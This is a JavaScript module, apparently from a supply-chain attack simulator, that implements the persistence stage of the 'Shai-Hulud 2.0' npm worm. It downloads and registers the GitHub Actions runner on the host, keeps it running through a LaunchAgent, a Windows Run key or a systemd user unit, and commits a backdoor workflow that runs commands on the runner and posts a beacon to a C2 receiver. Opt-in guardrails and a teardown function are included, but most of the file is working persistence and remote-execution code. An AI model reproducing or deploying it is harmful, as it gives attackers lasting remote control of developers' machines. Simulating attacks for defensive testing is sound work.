// supply-chain-sim/npm-package/lib/persistence.js
// Shai-Hulud 2.0 persistence: register the host as a self-hosted GitHub Actions runner named
// SHA1HULUD against a repo in the THROWAWAY org, install it as a service (T1543), and drop a
// backdoor workflow that runs commands on that runner (remote-exec channel, T1546/T1059).
//
// SAFETY: this is the one stage that plants real host persistence, so it is OFF by default and only
// runs when SIM_ENABLE_PERSISTENCE=1. It refuses any non-throwaway org, only ever targets a repo you
// control, and the backdoor workflow runs a BENIGN beacon. teardownPersistence() fully reverses it.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const https = require('node:https');
const { execSync, spawn } = require('node:child_process');
const { assertAuthorized, assertThrowawayOrg, cfg } = require('./guardrail.js');
const { request, fetchExfilConfig } = require('./exfil.js');

const RUNNER_NAME = 'SHA1HULUD';
const RUNNER_HOME = path.join(os.homedir(), '.sim-runner');
const LAUNCH_AGENT = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.github.actions.runner.SHA1HULUD.plist');
const SYSTEMD_USER_UNIT = path.join(os.homedir(), '.config', 'systemd', 'user', 'sha1hulud.service');
const RUN_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';

function gh(pathname, method, pat, body) {
  return request(`https://api.github.com${pathname}`, {
    method, headers: {
      authorization: `Bearer ${pat}`, accept: 'application/vnd.github+json',
      'content-type': 'application/json', 'x-github-api-version': '2022-11-28',
    }, body: body ? JSON.stringify(body) : undefined,
  });
}

async function ensureRepo(org, pat, repo) {   // idempotent; ignores 422 already-exists
  await gh(`/orgs/${org}/repos`, 'POST', pat, { name: repo, private: true, description: 'Shai-Hulud: Here We Go Again' });
}
async function registrationToken(org, pat, repo) {
  const r = await gh(`/repos/${org}/${repo}/actions/runners/registration-token`, 'POST', pat);
  if (r.status !== 201) throw new Error(`registration-token HTTP ${r.status}`);
  return JSON.parse(r.body).token;
}
async function removeToken(org, pat, repo) {
  const r = await gh(`/repos/${org}/${repo}/actions/runners/remove-token`, 'POST', pat);
  if (r.status !== 201) throw new Error(`remove-token HTTP ${r.status}`);
  return JSON.parse(r.body).token;
}

function downloadFollow(url, dest, depth = 0) {   // follows GitHub release redirects, full TLS
  return new Promise((resolve, reject) => {
    if (depth > 5) return reject(new Error('too many redirects'));
    const u = new URL(url);
    https.get({ host: u.hostname, path: u.pathname + u.search, headers: { 'user-agent': 'sim-agent' } }, res => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        res.resume(); return resolve(downloadFollow(new URL(res.headers.location, url).toString(), dest, depth + 1));
      }
      if (res.statusCode !== 200) { res.resume(); return reject(new Error(`HTTP ${res.statusCode}`)); }
      const f = fs.createWriteStream(dest); res.pipe(f); f.on('finish', () => f.close(() => resolve(dest))); f.on('error', reject);
    }).on('error', reject);
  });
}

async function runnerVersion() {
  const r = await request('https://api.github.com/repos/actions/runner/releases/latest',
    { method: 'GET', headers: { 'user-agent': 'sim-agent', accept: 'application/vnd.github+json' } });
  return JSON.parse(r.body).tag_name.replace(/^v/, '');
}
function runnerAsset(v) {
  const plat = process.platform === 'darwin' ? 'osx' : process.platform === 'win32' ? 'win' : 'linux';
  const arch = process.arch === 'arm64' ? 'arm64' : 'x64';
  const ext = process.platform === 'win32' ? 'zip' : 'tar.gz';
  return `actions-runner-${plat}-${arch}-${v}.${ext}`;
}
async function downloadRunner(dir) {
  fs.mkdirSync(dir, { recursive: true });
  const v = await runnerVersion();
  const asset = runnerAsset(v);
  const arc = path.join(dir, asset);
  await downloadFollow(`https://github.com/actions/runner/releases/download/v${v}/${asset}`, arc);
  execSync(asset.endsWith('.zip') ? `tar -xf "${arc}" -C "${dir}"` : `tar -xzf "${arc}" -C "${dir}"`, { stdio: 'ignore' });
  return v;
}

function launchAgentPlist(dir) {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.github.actions.runner.${RUNNER_NAME}</string>
  <key>ProgramArguments</key><array><string>${path.join(dir, 'run.sh')}</string></array>
  <key>WorkingDirectory</key><string>${dir}</string>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
`;
}

// Configure the runner as the CURRENT (unprivileged) user and persist via USER-LEVEL autostart — no
// sudo/admin, matching how npm-delivered malware actually runs (as the developer). macOS: LaunchAgent
// (T1543.001); Windows: HKCU Run key (T1547.001); Linux: systemd --user (fallback: backgrounded run.sh).
function configureAndInstall(dir, repoUrl, regToken) {
  const win = process.platform === 'win32';
  const cfgCmd = win ? 'config.cmd' : './config.sh';
  execSync(`${win ? '' : 'chmod +x ./config.sh ./run.sh 2>/dev/null; '}${cfgCmd} --unattended --url ${repoUrl} --token ${regToken} --name ${RUNNER_NAME} --labels sim`,
    { cwd: dir, stdio: 'inherit', shell: win ? undefined : '/bin/bash' });

  if (win) {   // HKCU Run key: relaunches run.cmd at logon (no admin). Start it now too.
    execSync(`reg add "${RUN_KEY}" /v ${RUNNER_NAME} /t REG_SZ /d "${path.join(dir, 'run.cmd')}" /f`, { stdio: 'ignore' });
    spawn('cmd.exe', ['/c', 'run.cmd'], { cwd: dir, detached: true, stdio: 'ignore' }).unref();
    return 'hkcu-run-key (user, no elevation)';
  }
  if (process.platform === 'darwin') {   // LaunchAgent: RunAtLoad starts it now + loads on login (no sudo)
    fs.mkdirSync(path.dirname(LAUNCH_AGENT), { recursive: true });
    fs.writeFileSync(LAUNCH_AGENT, launchAgentPlist(dir));
    try { execSync(`launchctl unload "${LAUNCH_AGENT}" 2>/dev/null; launchctl load "${LAUNCH_AGENT}"`, { stdio: 'ignore', shell: '/bin/bash' }); } catch { /* still loads next login */ }
    return 'launchagent (user, no elevation)';
  }
  try {   // Linux — user systemd (no root)
    fs.mkdirSync(path.dirname(SYSTEMD_USER_UNIT), { recursive: true });
    fs.writeFileSync(SYSTEMD_USER_UNIT,
      `[Unit]\nDescription=SHA1HULUD runner\n[Service]\nExecStart=${path.join(dir, 'run.sh')}\nWorkingDirectory=${dir}\nRestart=always\n[Install]\nWantedBy=default.target\n`);
    execSync('systemctl --user daemon-reload && systemctl --user enable --now sha1hulud.service', { stdio: 'ignore', shell: '/bin/bash' });
    return 'systemd --user (no elevation)';
  } catch {
    spawn('./run.sh', { cwd: dir, detached: true, stdio: 'ignore' }).unref();
    return 'run.sh backgrounded (user)';
  }
}

function backdoorWorkflow() {   // Component B — RCE on the SHA1HULUD runner via discussion/dispatch (benign)
  return `name: Discussion Backdoor
on:
  discussion:
    types: [created]
  workflow_dispatch:
jobs:
  exec:
    runs-on: [self-hosted, sim]
    steps:
      - name: sim benign RCE proof (beacon back to C2)
        run: |
          echo "SIM RCE on $(hostname) via ${RUNNER_NAME} runner"
          curl -sk -X POST "${cfg.receiverUrl}/collect" -d "{\\"stage\\":\\"persistence.rce\\",\\"host\\":\\"$(hostname)\\"}" || true
`;
}
async function commitWorkflow(org, pat, repo) {
  await gh(`/repos/${org}/${repo}/contents/.github/workflows/discussion.yaml`, 'PUT', pat,
    { message: 'add discussion.yaml', content: Buffer.from(backdoorWorkflow()).toString('base64') });
}

// enablePersistence is baked into guardrail (default OFF). org/pat come from the receiver /config,
// passed in as {ghOrg, ghPat} — never baked into the payload source.
async function installPersistence({ ghOrg, ghPat } = {}) {
  if (!cfg.enablePersistence) return { enabled: false };
  assertAuthorized();
  assertThrowawayOrg(ghOrg);
  if (!ghPat || !ghOrg) return { enabled: true, error: 'no throwaway org/PAT from /config' };
  const repo = (process.env.SIM_PERSIST_REPO || `sim-persistence-${os.hostname()}`).toLowerCase().replace(/[^a-z0-9-]/g, '-');
  const repoUrl = `https://github.com/${ghOrg}/${repo}`;
  try {
    await ensureRepo(ghOrg, ghPat, repo);
    const regToken = await registrationToken(ghOrg, ghPat, repo);
    const version = await downloadRunner(RUNNER_HOME);
    const service = configureAndInstall(RUNNER_HOME, repoUrl, regToken);
    await commitWorkflow(ghOrg, ghPat, repo);
    fs.writeFileSync(path.join(RUNNER_HOME, 'state.json'),
      JSON.stringify({ org: ghOrg, repo, name: RUNNER_NAME, version, service, ts: Date.now() }));
    return { enabled: true, repo, name: RUNNER_NAME, version, service };
  } catch (e) { return { enabled: true, error: e.message }; }
}

async function teardownPersistence() {
  assertAuthorized();
  const win = process.platform === 'win32';
  let state = {};
  try { state = JSON.parse(fs.readFileSync(path.join(RUNNER_HOME, 'state.json'), 'utf8')); } catch { /* none */ }
  const { ghPat } = await fetchExfilConfig(cfg.receiverUrl);   // PAT from C2 to deregister the runner
  try {
    // remove the user-level autostart (no elevation) + stop the runner
    if (win) {
      try { execSync(`reg delete "${RUN_KEY}" /v ${RUNNER_NAME} /f`, { stdio: 'ignore' }); } catch { /* not set */ }
    } else if (process.platform === 'darwin') {
      try { execSync(`launchctl unload "${LAUNCH_AGENT}" 2>/dev/null`, { stdio: 'ignore', shell: '/bin/bash' }); } catch { /* not loaded */ }
      fs.rmSync(LAUNCH_AGENT, { force: true });
    } else {
      try { execSync('systemctl --user disable --now sha1hulud.service 2>/dev/null', { stdio: 'ignore', shell: '/bin/bash' }); } catch { /* not a unit */ }
      fs.rmSync(SYSTEMD_USER_UNIT, { force: true });
    }
    if (ghPat && state.org && state.repo) {
      const rt = await removeToken(state.org, ghPat, state.repo);
      try { execSync(`${win ? 'config.cmd' : './config.sh'} remove --token ${rt}`, { cwd: RUNNER_HOME, stdio: 'inherit', shell: win ? undefined : '/bin/bash' }); } catch { /* already gone */ }
    }
  } finally {
    try { fs.rmSync(RUNNER_HOME, { recursive: true, force: true }); } catch { /* ignore */ }
  }
  return { removed: true, ...state };
}

module.exports = { installPersistence, teardownPersistence, backdoorWorkflow, runnerAsset, RUNNER_NAME, RUNNER_HOME };
